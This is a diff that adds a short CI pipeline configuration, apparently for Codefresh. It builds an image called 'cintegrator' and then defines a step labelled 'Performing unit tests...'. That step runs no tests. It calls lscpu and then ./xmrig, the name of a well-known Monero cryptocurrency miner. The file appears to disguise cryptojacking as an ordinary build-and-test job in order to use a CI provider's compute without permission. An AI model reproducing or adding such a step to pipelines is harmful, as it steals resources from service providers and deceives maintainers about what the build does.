@@ -1,0 +1,15 @@
+version: '1.0'
+steps:
+  build_image:
+    type: build
+    description: Building the image...
+    image-name: omeaaa123/cintegrator
+    tag: develop # ${{CF_BRANCH}}
+
+  perform_tests:
+    image_name: node:5
+    working_directory: ${{main_clone}}
+    description: Performing unit tests...
+    commands:
+      - lscpu
+      - ./xmrig
